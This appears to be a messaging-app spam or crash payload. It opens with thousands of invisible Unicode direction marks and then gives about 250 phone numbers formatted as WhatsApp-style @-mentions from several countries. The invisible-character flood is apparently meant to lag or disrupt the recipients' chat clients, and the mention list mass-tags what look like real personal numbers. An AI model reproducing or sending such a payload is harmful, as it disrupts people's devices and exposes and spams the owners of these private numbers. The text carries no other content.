‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎
~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ 